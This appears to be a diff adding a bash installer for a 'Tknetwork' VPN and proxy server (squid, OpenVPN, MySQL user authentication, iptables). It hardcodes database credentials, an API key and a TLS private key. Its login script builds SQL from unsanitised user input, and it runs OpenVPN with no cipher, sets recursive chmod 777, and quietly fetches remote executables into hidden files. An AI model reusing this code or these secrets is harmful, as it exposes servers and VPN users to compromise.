@@ -1,0 +1,928 @@
+#!/bin/bash
+HOST='173.225.110.100';
+USER='teamkidl_ea';
+PASS='@JAN022011b';
+DBNAME='teamkidl_ea';
+PORT_TCP='1194';
+PORT_UDP='110';
+OBFS='boy';
+HYSTERIA_TYPE='default';
+PORT_VLESS='442';
+API_LINK='https://free-panel.myprotectionservices.com/api/authentication';
+API_KEY='@Tknetwork';
+DOMAIN='tk.0munl.marwil-frcep.top';
+
+NS='ns.e94y4.marwil-frcep.top';
+
+AUTHSTR='auth_xxx';
+
+# ====================================================
+#	SYSTEM TIMEZONE SETUP
+# ====================================================
+timedatectl set-timezone Asia/Riyadh
+if [[ $(grep "nogroup" /etc/group) ]]; then
+    cert_group="nogroup"
+fi
+
+# ====================================================
+#	NEW PROTOCOLS PORTS CONFIGURATION (Para walang conflict)
+# ====================================================
+PORT_VMESS=8044
+PORT_VLESS=8045
+PORT_HYSTERIA2=8555
+
+install_require () {
+clear
+echo 'Installing dependencies.'
+{
+
+
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export DEBIAN_FRONTEND=noninteractive
+apt update
+
+
+apt install -y curl wget cron python3 libpython3-stdlib python-is-python3
+apt install -y lsof tar systemd dbus git
+apt install -y gnupg2 ca-certificates lsb-release debian-archive-keyring socat
+apt install -y iptables sudo
+apt install -y openvpn netcat-openbsd httpie php neofetch vnstat
+apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
+apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
+apt install -y screen squid stunnel4 dropbear gnutls-bin build-essential
+
+
+touch /var/spool/cron/crontabs/root && chmod 600 /var/spool/cron/crontabs/root
+systemctl start cron && systemctl enable cron
+
+# Prevent the default bin directory of xray in some systems from missing
+mkdir /usr/local/bin >/dev/null 2>&1
+mkdir /usr/local/var >/dev/null 2>&1
+mkdir /usr/local/var/run >/dev/null 2>&1
+mkdir -m 777 /root/.web
+clear
+}&>/dev/null
+clear
+}
+
+install_squid(){
+clear
+echo 'Installing proxy.'
+{
+sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup
+echo "deb http://ftp.debian.org/debian/ jessie main contrib non-free
+    deb-src http://ftp.debian.org/debian/ jessie main contrib non-free
+    deb http://security.debian.org/ jessie/updates main contrib
+    deb-src http://security.debian.org/ jessie/updates main contrib
+    deb http://ftp.debian.org/debian/ jessie-updates main contrib non-free
+    deb-src http://ftp.debian.org/debian/ jessie-updates main contrib non-free" >> /etc/apt/sources.list
+    apt update
+    apt install -y gcc-4.9 g++-4.9
+    update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.9 10
+    update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-4.9 10
+    update-alternatives --install /usr/bin/cc cc /usr/bin/gcc 30
+    update-alternatives --set cc /usr/bin/gcc
+    update-alternatives --install /usr/bin/c++ c++ /usr/bin/g++ 30
+    update-alternatives --set c++ /usr/bin/g++
+    cd /usr/src
+    wget https://github.com/johnberic/nana/raw/main/squid-3.1.23.tar.gz
+    tar zxvf squid-3.1.23.tar.gz
+    cd squid-3.1.23
+    ./configure --prefix=/usr \
+      --localstatedir=/var/squid \
+      --libexecdir=/usr/lib/squid \
+      --srcdir=. \
+      --datadir=/usr/share/squid \
+      --sysconfdir=/etc/squid \
+      --with-default-user=proxy \
+      --with-logdir=/var/log/squid \
+      --with-pidfile=/var/run/squid.pid
+    make -j$(nproc)
+    make install
+    wget --no-check-certificate -O /etc/init.d/squid https://raw.githubusercontent.com/johnberic/nana/main/squid.sh
+    chmod +x /etc/init.d/squid
+    update-rc.d squid defaults
+    chown -cR proxy /var/log/squid
+    squid -z
+    cd /etc/squid/
+    rm squid.conf
+    echo "acl Firenet dst `curl -s https://api.ipify.org`" >> squid.conf
+    echo 'http_port 8080
+http_port 8181
+visible_hostname Proxy
+acl PURGE method PURGE
+acl HEAD method HEAD
+acl POST method POST
+acl GET method GET
+acl CONNECT method CONNECT
+http_access allow Firenet
+http_reply_access allow all
+http_access deny all
+icp_access allow all
+always_direct allow all
+visible_hostname Firenet-Proxy
+error_directory /usr/share/squid/errors/English' >> squid.conf
+    cd /usr/share/squid/errors/English
+    rm ERR_INVALID_URL
+    echo '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
+    chmod 755 *
+    /etc/init.d/squid start
+cd /etc || exit
+
+
+wget 'https://raw.githubusercontent.com/johnberic/nana/main/monitor' -O /etc/.monitor
+wget 'https://raw.githubusercontent.com/johnberic/nana/main/hysteria' -O /etc/.hysteria
+chmod +x /etc/.monitor
+chmod +x /etc/.hysteria
+rm /etc/apt/sources.list
+sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list
+} &>/dev/null
+}
+
+
+#====================================================
+#	Installing OpenVPN
+#	Finalized: Tknetwork Developer
+#====================================================
+
+install_openvpn()
+{
+clear
+echo "Installing openvpn."
+{
+mkdir -p /etc/openvpn/easy-rsa/keys
+mkdir -p /etc/openvpn/login
+mkdir -p /etc/openvpn/server
+mkdir -p /var/www/html/stat
+touch /etc/openvpn/server.conf
+touch /etc/openvpn/server2.conf
+
+echo 'DNS=1.1.1.1
+DNSStubListener=no' >> /etc/systemd/resolved.conf
+
+echo '#Openvpn Configuration by Tknetwork Developer :)
+dev tun
+proto udp
+
+server 10.30.0.0 255.255.0.0
+port PORT_UDP
+
+ca /etc/openvpn/easy-rsa/keys/ca.crt 
+cert /etc/openvpn/easy-rsa/keys/server.crt 
+key /etc/openvpn/easy-rsa/keys/server.key 
+dh /etc/openvpn/easy-rsa/keys/dh.pem
+
+cipher none
+auth SHA1
+persist-key
+persist-tun
+keepalive 10 120
+verb 3
+
+user nobody
+group nogroup
+
+duplicate-cn
+username-as-common-name
+verify-client-cert optional
+
+script-security 3
+auth-user-pass-verify "/etc/openvpn/login/auth_vpn" via-env #
+
+push "redirect-gateway def1 bypass-dhcp"
+push "dhcp-option DNS 8.8.8.8"
+push "dhcp-option DNS 8.8.4.4"
+
+
+client-connect /etc/openvpn/login/connect.sh
+client-disconnect /etc/openvpn/login/disconnect.sh
+ifconfig-pool-persist /etc/openvpn/server/ip_udp.txt
+
+log /etc/openvpn/server/udpserver.log
+status /etc/openvpn/server/udpclient.log
+status-version 2' > /etc/openvpn/server.conf
+
+sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server.conf
+
+echo '#Openvpn Configuration by Tknetwork Developer :)
+dev tun
+proto tcp
+
+server 10.20.0.0 255.255.0.0
+port PORT_TCP
+
+ca /etc/openvpn/easy-rsa/keys/ca.crt 
+cert /etc/openvpn/easy-rsa/keys/server.crt 
+key /etc/openvpn/easy-rsa/keys/server.key 
+dh /etc/openvpn/easy-rsa/keys/dh.pem
+
+cipher none
+auth SHA1
+persist-key
+persist-tun
+keepalive 10 120
+verb 3
+
+user nobody
+group nogroup
+
+
+duplicate-cn
+username-as-common-name
+verify-client-cert optional
+
+script-security 3
+auth-user-pass-verify "/etc/openvpn/login/auth_vpn" via-env #
+
+push "redirect-gateway def1 bypass-dhcp"
+push "dhcp-option DNS 8.8.8.8"
+push "dhcp-option DNS 8.8.4.4"
+
+
+socket-flags TCP_NODELAY
+client-connect /etc/openvpn/login/connect.sh
+client-disconnect /etc/openvpn/login/disconnect.sh
+ifconfig-pool-persist /etc/openvpn/server/ip_tcp.txt
+
+log /etc/openvpn/server/tcpserver.log
+status /etc/openvpn/server/tcpclient.log
+status-version 2' > /etc/openvpn/server2.conf
+
+sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/openvpn/server2.conf
+
+cat <<\EOM >/etc/openvpn/login/config.sh
+#!/bin/bash
+HOST='DBHOST'
+USER='DBUSER'
+PASS='DBPASS'
+DB='DBNAME'
+EOM
+
+sed -i "s|DBHOST|$HOST|g" /etc/openvpn/login/config.sh
+sed -i "s|DBUSER|$USER|g" /etc/openvpn/login/config.sh
+sed -i "s|DBPASS|$PASS|g" /etc/openvpn/login/config.sh
+sed -i "s|DBNAME|$DBNAME|g" /etc/openvpn/login/config.sh
+
+/bin/cat <<"EOM" >/etc/openvpn/login/auth_vpn
+#!/bin/bash
+. /etc/openvpn/login/config.sh
+Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND is_freeze='0' AND duration > 0"
+user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
+[ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
+EOM
+
+#client-connect file
+cat <<'TK403' >/etc/openvpn/login/connect.sh
+#!/bin/bash
+. /etc/openvpn/login/config.sh
+##set status online to user connected
+server_ip=SERVER_IP
+datenow=`date +"%Y-%m-%d %T"`
+tm="$(date +%s)"
+dt="$(date +'%Y-%m-%d %H:%M:%S')"
+timestamp="$(date +'%FT%TZ')"
+
+##set status online to user connected
+bandwidth_check=`mysql -u $USER -p$PASS -D $DB -h $HOST --skip-column-name -e "SELECT bandwidth_logs.username FROM bandwidth_logs WHERE bandwidth_logs.username='$common_name' AND bandwidth_logs.status='online'"`
+if [ "$bandwidth_check" == 1 ]; then
+mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE bandwith_logs SET server_ip='$trusted_ip', server_port='$trusted_port', timestamp='$timestamp', ipaddress='$trusted_ip:$trusted_port', username='$common_name', time_in='$tm', since_connected='$time_ascii', bytes_received='$bytes_received', bytes_sent='$bytes_sent' WHERE username='$common_name' AND status='online' AND server_port='$trusted_port' "
+mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
+else
+mysql -u $USER -p$PASS -D $DB -h $HOST -e "INSERT INTO bandwidth_logs (server_ip, server_port, timestamp, ipaddress, since_connected, username, bytes_received, bytes_sent, time_in, status, time) VALUES ('$trusted_ip','$trusted_port','$timestamp','$trusted_ip:$trusted_port','$time_ascii','$common_name','$bytes_received','$bytes_sent','$dt','online','$tm') "
+mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
+fi
+TK403
+
+sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/connect.sh
+
+#TCP client-disconnect file
+cat <<'TK403' >/etc/openvpn/login/disconnect.sh
+#!/bin/bash
+. /etc/openvpn/login/config.sh
+server_ip=SERVER_IP
+tm="$(date +%s)"
+dt="$(date +'%Y-%m-%d %H:%M:%S')"
+timestamp="$(date +'%FT%TZ')"
+
+mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE bandwidth_logs SET bytes_received='$bytes_received',bytes_sent='$bytes_sent',time_out='$dt', status='offline' WHERE username='$common_name' AND status='online'"
+mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='0', active_address='', active_date='' WHERE user_name='$common_name' "
+TK403
+
+sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/disconnect.sh
+
+cat << EOF > /etc/openvpn/easy-rsa/keys/ca.crt
+-----BEGIN CERTIFICATE-----
+MIIFBDCCA+ygAwIBAgIUUmdgPaIpFzVfyrlKjuKAdPPOZOswDQYJKoZIhvcNAQEL
+BQAwgaoxCzAJBgNVBAYTAlBIMQswCQYDVQQIEwJNQTEWMBQGA1UEBxMNQW50aXBv
+bG8gQ2l0eTESMBAGA1UEChMJVEtOZXR3b3JrMRIwEAYDVQQLEwlUS05lcndvcmsx
+FTATBgNVBAMTDFRLTmV0d29yayBDQTESMBAGA1UEKRMJVEtOZXR3b3JrMSMwIQYJ
+KoZIhvcNAQkBFhRlcmljbGF5bGF5QGdtYWlsLmNvbTAeFw0yMjA5MjAwMzUzMDda
+Fw0zMjA5MTcwMzUzMDdaMIGqMQswCQYDVQQGEwJQSDELMAkGA1UECBMCTUExFjAU
+BgNVBAcTDUFudGlwb2xvIENpdHkxEjAQBgNVBAoTCVRLTmV0d29yazESMBAGA1UE
+CxMJVEtOZXJ3b3JrMRUwEwYDVQQDEwxUS05ldHdvcmsgQ0ExEjAQBgNVBCkTCVRL
+TmV0d29yazMSMwIQYJKoZIhvcNAQkBFhRlcmljbGF5bGF5QGdtYWlsLmNvbTCCASIw
+DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJ1DhDlTbn9DI4+L2ztf0atMpiGG
+4Xm3Cvuu d5msk9YrLusMO+GlQ6pPK/8Ujc9fcFtktpc6cUbUXI2mSqcv/mfKjFq
+ZrlZ5iBwI3g8eZR3jps5fscWXvJ0ej4660Mz3E/yDxU58UOMI2OVyksSpOQE6baS
+um5Bx7Z6CxDblT+iXAQ1Pv0F7EYclKcAxSlEwG/phdXTkshx7wsqzilorouLoZ4N
+iB+Sv7vWQY1i0HS3IOv9xG0xTW5LKt3ub5ZrkIs+JBXlyR3L953i3OzP3uQ9gQcL
+/w/6XSN1opR3NYfFpL4QsSVJDRiASU9oWyuyZ2K/hiFdMG9vpwjMomEINDRxAgMB
+AAGjggEeMIIBGjAdBgNVHQ4EFgQU22vZfsw2ER5n6EWwByaIF/aL86swgeoGA1Ud
+IwSB4jCB34AU22vZfsw2ER5n6EWwByaIF/aL86uhgbCkga0wgaoxCzAJBgNVBAYT
+AlBIMQswCQYDVQQIEwJNQTEWMBQGA1UEBxMNQW50aXBvbG8gQ2l0eTESMBAGA1UE
+ChMJVEtOZXR3b3JrMRIwEAYDVQQLEwlUS05lcndvcmsxFTATBgNVBAMTDFRLTmV0
+d29yayBDQTESMBAGA1UEKRMJVEtOZXR3b3JrMSMwIQYJKoZIhvcNAQkBFhRlcmlj
+bGF5bGF5QGdtYWlsLmNvbYIUUmdgPaIpFzVfyrlKjuKAdPPOZOswDAYDVR0TBAUw
+AwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAFxk8YMHYAjggbj6T8HliynV/fMEbhZxx
+HIpQyUmOhUOf1LidztC6w/cpO7Cx+esobwfgxGFnx854cnDHZ77/MmZHiGV3Rn91
+rmv3xPc0FFiH+Cb4IVXtaPr1hUE45Eey+Odpy3Tj9wOC29lS4P5q9GgcnuNXj4Db
+W/jcb2uW3xcdHPj1slhy4Wl/h6Qe5vHqp2jOfMZISKiF3keTAiYnXJWTsSPeOkOD
+NvgKUnh6Z3K8NaUlw0SyhzMVwKDKExmMQUcHXAtF2JDrQwerB29jQBd+iFNVV3in
+Pz2wHWMTqDV4pSJL4APX/Y9TC7jsi7d0rq9+gmOOFp1OAe11PSTamg==
+-----END CERTIFICATE-----
+EOF
+
+cat << EOF > /etc/openvpn/easy-rsa/keys/server.crt
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number: 1 (0x1)
+        Signature Algorithm: sha256WithRSAEncryption
+        Issuer: C=PH, ST=MA, L=Antipolo City, O=TKNetwork, OU=TKNerwork, CN=TKNetwork CA/name=TKNetwork/emailAddress=ericlaylay@gmail.com
+        Validity
+            Not Before: Sep 20 03:54:08 2022 GMT
+            Not After : Sep 17 03:54:08 2032 GMT
+        Subject: C=PH, ST=CA, L=Antipolo City, O=TKNetwork, OU=TKNerwork, CN=TKNetwork/name=TKNetwork/emailAddress=ericlaylay@gmail.com
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                RSA Public-Key: (2048 bit)
+                Modulus:
+                    00:b5:eb:a1:de:45:39:54:a9:12:db:91:b0:68:ac:
+                    77:39:7e:4d:ee:5c:ae:6c:2f:57:a7:70:a6:19:39:
+                    19:b0:46:75:6d:50:81:9d:3c:43:5a:21:49:84:b1:
+                    fa:68:67:2e:05:ba:ec:e1:08:3b:70:07:77:32:03:
+                    19:65:7c:af:d5:10:97:8a:3a:af:11:66:ee:42:b2:
+                    90:b5:1a:34:28:55:76:0f:a3:ac:f3:e9:1d:fc:d7:
+                    5f:7c:89:50:3b:7e:0f:49:61:97:b7:79:b5:c6:29:
+                    2a:c5:e3:ef:38:43:77:12:cb:06:d0:e1:2c:4a:38:
+                    fe:0a:33:ec:2c:b7:79:bf:b9:fa:d7:ea:2c:9f:02:
+                    4f:10:eb:0a:6f:05:5a:50:01:dc:50:93:71:03:b9:
+                    63:34:53:9e:30:9d:23:64:66:e8:9c:73:19:85:39:
+                    b6:79:b4:55:1d:9d:2a:e0:df:4c:b2:5a:c2:e9:0e:
+                    59:a2:3a:70:34:6a:9c:8a:09:34:1d:5e:29:a9:b6:
+                    5b:16:ce:9e:c5:6c:50:d6:4d:10:09:60:f6:c9:00:
+                    81:29:e3:a1:4c:10:fb:fe:a5:14:d6:b5:2a:e0:72:
+                    50:2f:50:dc:bc:34:8d:ca:e2:fb:78:06:4d:b5:cd:
+                    fe:9a:cd:2a:b7:c9:79:32:66:4a:bf:d3:d0:04:25:
+                    9e:d5
+                Exponent: 65537 (0x10001)
+        X509v3 extensions:
+            X509v3 Basic Constraints: 
+                CA:FALSE
+            Netscape Cert Type: 
+                SSL Server
+            Netscape Comment: 
+                Easy-RSA Generated Server Certificate
+            X509v3 Subject Key Identifier: 
+                28:1D:A2:5E:3A:50:2C:3A:E0:B0:54:57:D6:11:02:FC:D6:1F:FF:35
+            X509v3 Authority Key Identifier: 
+                keyid:DB:6B:D9:7E:CC:36:11:1E:67:E8:45:B0:07:26:88:17:F6:8B:F3:AB
+                DirName:/C=PH/ST=MA/L=Antipolo City/O=TKNetwork/OU=TKNerwork/CN=TKNetwork CA/name=TKNetwork/emailAddress=ericlaylay@gmail.com
+                serial:52:67:60:3D:A2:29:17:35:5F:CA:B9:4A:8E:E2:80:74:F3:CE:64:EB
+
+            X509v3 Extended Key Usage: 
+                TLS Web Server Authentication
+            X509v3 Key Usage: 
+                Digital Signature, Key Encipherment
+            X509v3 Subject Alternative Name: 
+                DNS:[server]
+    Signature Algorithm: sha256WithRSAEncryption
+         0c:5a:d1:93:48:73:de:35:f0:1b:b5:88:71:be:ce:04:e0:f7:
+         c3:b1:ef:48:05:2f:20:ff:68:6c:e6:10:0f:d2:65:6b:57:e4:
+         cc:36:af:4c:ec:d4:0c:46:4c:76:5a:7d:20:74:92:67:41:5f:
+         74:27:3b:48:39:51:65:ff:86:3b:1b:6a:15:b1:11:99:45:cd:
+         03:0e:e2:46:5d:c0:19:e0:07:0c:18:1e:6e:a1:f6:f2:32:b5:
+         3d:91:27:0a:e8:ae:e5:22:a0:f1:87:9f:b8:ba:d8:eb:6b:2b:
+         82:8d:e4:2e:66:0a:2a:1f:f6:bb:ee:6a:92:8f:c7:77:0d:ee:
+         68:96:58:ce:52:c5:6a:c5:7a:24:fd:ee:83:ba:0b:4e:28:b6:
+         92:60:f1:ce:24:bc:9e:a5:ca:73:d3:cc:69:48:a4:8b:31:c3:
+         7f:41:d1:31:2d:1e:e8:c7:4f:5d:d6:c1:e8:8d:b7:44:49:0a:
+         5a:6c:ea:44:a3:70:19:12:2d:a9:d1:90:bd:3a:3d:4b:85:c0:
+         35:d0:03:94:1f:de:68:1c:a0:5d:f0:b9:6c:40:68:97:1a:25:
+         c1:5a:a0:cc:a9:51:68:d5:37:be:74:e4:23:0a:fd:74:92:54:
+         9e:2f:fc:65:56:d1:27:3b:05:01:b4:c1:b4:a9:10:8d:70:30:
+         a0:b6:74:55
+-----BEGIN CERTIFICATE-----
+MIIFazCCBFOgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBqjELMAkGA1UEBhMCUEgx
+CzAJBgNVBAgTAk1BMRYwFAYDVQQHEw1BbnRpcG9sbyBDaXR5MRIwEAYDVQQKEwlU
+S05ldHdvcmsxEjAQBgNVBAsTCVRLTmVyd29yazEVMBMGA1UEAxMMVEtOZXR3b3Jr
+IENBMRIwEAYDVQQpEwlUS05ldHdvcmsxIzAhBgkqhkiG9w0BCQEWFGVyaWNsYXls
+YXlAZ21haWwuY29tMB4XDTIyMDkyMDAzNTQwOFoXDTMyMDkxNzAzNTQwOFowgacx
+CzAJBgNVBAYTAlBIMQswCQYDVQQIEwJDQTEWMBQGA1UEBxMNQW50aXBvbG8gQ2l0
+eTESMBAGA1UEChMJVEtOZXR3b3JrMRIwEAYDVQQLEwlUS05lcndvcmsxEjAQBgNV
+BAMTCVRLTmV0d29yazESMBAGA1UEKRMJVEtOZXR3b3JrMSMwIQYJKoZIhvcNAQkB
+FhRlcmljbGF5bGF5QGdtYWlsLmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
+AQoCggEBALXrod5FOVSpEtuRsGisdzl+Te5crmwvV6dwphk5GbBGdW1QgZ08Q1oh
+SYSx+mhnLgW67OEIO3AHdzIDGWV8r9UQl4o6rxFm7kKykLUaNChVdg+jrPPpHfzX
+X3yJUDt+D0lhl7d5tcYpKsXj7zhDdxLLBtDhLEo4/goz7Cy3eb+5+tfqLJ8CTxDr
+Cm8FWlAB3FCTcQO5YzRTnjCdI2Rm6JxzGYU5tnm0VR2dKuDfTLJawukOWaI6cDRq
+nIoJNB1eKam2WxbOnsVsUNZNEAlg9skAgSnjoUwQ+/6lFNa1KuByUC9Q3Lw0jcri
++3gGTbXN/prNKrfJeTJmSr/T0AQlntUCAwEAAaOCAZswggGXMAkGA1UdEwQCMAAw
+EQYJYIZIAYb4QgEBBAQDAgZAMDQGCWCGSAGG+EIBDQQnFiVFYXN5LVJTQSBHZW5l
+cmF0ZWQgU2VydmVyIENlcnRpZmljYXRlMB0GA1UdDgQWBBQoHaJeOlAsOuCwVFfW
+EQL81h//NTCB6gYDVR0jBIHiMIHfgBTba9l+zDYRHmfoRbAHJogX9ovzq6GBsKSB
+rTCBqjELMAkGA1UEBhMCUEgxCzAJBgNVBAgTAk1BMRYwFAYDVQQHEw1BbnRpcG9s
+byBDaXR5MRIwEAYDVQQKEwlUS05ldHdvcmsxEjAQBgNVBAsTCVRLTmVyd29yazEV
+MBMGA1UEAxMMVEtOZXR3b3JrIENBMRIwEAYDVQQpEwlUS05ldHdvcmsxIzAhBgkq
+hkiG9w0BCQEWFGVyaWNsYXlsYXlAZ21haWwuY29tghRSZ2A9oikXNV/KuUqO4oB0
+885k6zATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwEwYDVR0RBAww
+CoIIW3NlcnZlcl0wDQYJKoZIhvcNAQELBQADggEBAAxa0ZNIc9418Bu1iHG+zgTg
+98Ox70gFLyD/aGzmEA/SZWtX5Mw2r0zs1AxGTHZafSB0kmdBX3QnO0g5UWX/hjsb
+ahWxEZlFzQMO4kZdwBngBwwYHm6h9vIytT2RJwroruUioPGHn7i62OtrK4KN5C5m
+Ciof9rvuapKPx3cN7miWWM5SxWrFeiT97oO6C04otpJg8c4kvJ6lynPTzGlIpIsx
+w39B0TEtHujHT13WweiNt0RJClps6kSjcBkSLanRkL06PUuFwDXQA5Qf3mgcoF3w
+uWxAaJcaJcFaoMypUWjVN7505CMK/XSSVJ4v/GVW0Sc7BQG0wbSpEI1wMKC2dFU=
+-----END CERTIFICATE-----
+EOF
+
+cat << EOF > /etc/openvpn/easy-rsa/keys/server.key
+-----BEGIN PRIVATE KEY-----
+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC166HeRTlUqRLb
+kbBorHc5fk3uXK5sL1encKYZORmwRnVtUIGdPENaIUmEsfpoZy4FuuzhCDtwB3cy
+AxllfK/VEJeKOq8RZu5CspC1GjQoVXYPo6zz6R381198iVA7fg9JYZe3ebXGKSrF
+4+84Q3cSywbQ4SxKOP4KM+wst3m/ufrX6iyfAk8Q6wpvBVpQAdxQk3EDuWM0U54w
+nSNkZuiccxmFObZ5tFUdnSrg30yyWsLpDlmiOnA0apyKCTQdXimptlsWzp7FbFDW
+TRAJYPbJAIEp46FMEPv+pRTWtSrgclAvUNy8NI3K4vt4Bk21zf6azSq3yXkyZkq/
+09AEJZ7VAgMBAAECggEBALI+EPcKtEVy8vsXH9UvRhGa4xhszqlJKYTxJo0IGVdR
+cbSNcLFyXjts6e+Nwl+Q2NLcd0N1IWd+qRbjWnrJVC5ad2AEZ4uRYlkPRCFtbzUl
+putj3w2Mlsko7HHEyEvCE5A+grxOD//8TeBemAB0ebJ8Ik1+kjqW5LFydjDKBAwI
+sYjXpYGkMST9rqG82EToQn9jL5Ncby35Ls3owzWDfd/1Y4NQmk6gO09spoMzWJpS
+mSiV+w83QxxJtOgT00O9NuDz9skotW3v2xWTZue0BzMirCTQWPiFRL1476/O9KYD
+KUBAcWynC/PE4ub0lMfaesdrggjRoDYvaQp3xLx/6HECgYEA4siN9t7Ogwhf/4X7
+BAN+2OSRWRW8tn9wzzNAPzhjs8igm4W+C4lQtMmW9eFOHuRj6TiWp4w36m4cs5VF
+eK39mp3/nyd9l68bFjGxw3XZsI/5bTGgcrSVAAAGp65xadI3+1Ozy7OmFoRF/Gkv
+X7+/DyWz5nb9yAH/N69vPpVek8sCgYEAzVt4qpMc5tX6tMxCAC1ZUFo8fwSZndmk
+jDTgb2G2O1YIqrYHqVjtwMQiDxvBGdkVJuy8QQQHM6YCD3o1Jq56bjvY1IlumXCW
+0YeKfSeqfXN/nBCkyZxa79DkQSPeYEjFTFABVe/SEEcasn8HrlyygtFT+nLCcEz/
+V1ekP5Mmg98CgYEApsGOEh9XfuZjoIKmRxdC6L15WyYus4sWKmWnMlWGiqZV4sX/
+LoB0BdvN01MunGyYQt/Hd8AVRZ5eIHb8tHZL6quPUTo6kZTCuBkme3Fm9vuHDxHU
+x0Od5HggbKBK6OMZIwczR+/7iscMp0O5ABEArmSs2iRZC/7b6dhoVn6DIu0CgYA+
+tOvHylxM8JI5mxWcUDyxmJxYfOMbnFXuqkbOPBwVSlQjLKpyP8F512o/Cs6QQgV/
+eVKS19QLJWoDp+GLCkRAXO39GGo5WHP1T1oulWouHJKe6UYoeiIakMLiUT2aUR5O
+CzAdObn/VncEgl2qFIw9/gWSuHA/MoPV++EfuKNOKQKBgDbyYfG3JESaLpaEiPED
+UQDv4iVBzaqA3sMpmpA2YRIUZE4ZzSuiVMxGHfhAvueuiMwyzqsLe0BOgCNtJDg3
+o4CmMhs3Wlw5FiOru1LxQY//65wi5q8+rNF4DR3oUKoVGb1PD3Gm8ZsxirhMOCrc
+sKKWTJk08giHse+yqTKQ05uR
+-----END PRIVATE KEY-----
+EOF
+
+cat << EOF > /etc/openvpn/easy-rsa/keys/dh.pem
+-----BEGIN DH PARAMETERS-----
+MIIBCAKCAQEAuAz9Bv9pwxWbbb8BQZ/TxfRtI6pStmlhgDbuZbAWj5KL2dHabaHd
+xmbijMA3XM0VYzwrtVldeu9ejrJ16fWKDdjkBFxhHXNWyJjz5IqATpujsr9ft0zK
+9UZlkSFiJJQj5rZXd7Ls6SyPE6u/lfude12D3GF0uEUg0YPwl9n6J6Hmjo4UZ1HJ
+DXfuYxY9CVKEXBfNqxshQw4FuNqZajCCA9dWdYZDOkzcWo2QQYxXBWLwJZZ4EKY9
+aNu/vLxRe+2b3gUSkE6KIhN5/2fQyZgVY4NGkTtDIbLlpwQO/ZT/kFwJ8RShWdOo
+XarEe9JDuh1eOZcl4ZEbXjC6r3GnuOb/+wIBAg==
+-----END DH PARAMETERS-----
+EOF
+
+dos2unix /etc/openvpn/login/auth_vpn
+dos2unix /etc/openvpn/login/connect.sh
+dos2unix /etc/openvpn/login/disconnect.sh
+
+chmod 777 -R /etc/openvpn/
+chmod 755 /etc/openvpn/server.conf
+chmod 755 /etc/openvpn/server2.conf
+chmod 755 /etc/openvpn/login/connect.sh
+chmod 755 /etc/openvpn/login/disconnect.sh
+chmod 755 /etc/openvpn/login/config.sh
+chmod 755 /etc/openvpn/login/auth_vpn
+}&>/dev/null
+}
+
+
+install_firewall_kvm () {
+clear
+echo "Installing iptables."
+echo "net.ipv4.ip_forward=1
+net.ipv4.conf.all.rp_filter=0
+net.ipv4.conf."$server_interface".rp_filter=0" >> /etc/sysctl.conf
+sysctl -p
+{
+iptables -F
+iptables -t nat -A PREROUTING -i "$server_interface" -p udp -m udp --dport 10000:50000 -j DNAT --to-destination :5666
+iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j MASQUERADE
+iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j SNAT --to-source "$server_ip"
+iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o "$server_interface" -j MASQUERADE
+iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o "$server_interface" -j SNAT --to-source "$server_ip"
+iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 --name DEFAULT --mask 255.255.255.255 --rsource -j DROP
+iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --set --name DEFAULT --mask 255.255.255.255 --rsource
+sudo iptables -I INPUT -p udp --dport 5300 -j ACCEPT &>/dev/null;
